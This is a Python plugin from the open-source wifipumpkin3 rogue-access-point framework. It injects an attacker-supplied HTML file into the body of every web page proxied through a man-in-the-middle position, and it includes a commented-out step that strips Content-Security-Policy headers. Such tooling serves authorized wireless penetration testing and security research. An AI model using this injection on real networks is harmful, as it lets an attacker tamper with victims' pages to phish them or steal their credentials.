from wifipumpkin3.plugins.pumpkinproxy.base import BasePumpkin
from os import path
from bs4 import BeautifulSoup

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2021 Commaders Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class html_inject(BasePumpkin):
    meta = {
        "_name": "html_inject",
        "_version": "1.1",
        "_description": "inject arbitrary HTML code into a vulnerable web page.",
        "_author": "Commaders",
    }

    @staticmethod
    def getName():
        return html_inject.meta["_name"]

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.filehtml = self._config.get("set_html_inject", "content_path")
        self.isfilePath = False
        if path.isfile(self.filehtml):
            self.isfilePath = True
            self.content = open(self.filehtml, "r").read()

    def handleResponse(self, request, data):
        if self.isfilePath:
            html = BeautifulSoup(data, "html.parser")
            """
                # To Allow CORS
                if "Content-Security-Policy" in flow.response.headers:
                    del flow.response.headers["Content-Security-Policy"]
                """
            if html.body:
                temp_soup = BeautifulSoup(self.content, "lxml")
                html.body.insert(len(html.body.contents), temp_soup)
                data = str(html)
                print("[{}] [Request]: {} | injected ".format(self._name, request.uri))
        return data